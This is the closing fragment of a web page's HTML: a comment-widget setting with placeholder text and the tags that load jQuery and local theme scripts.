        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
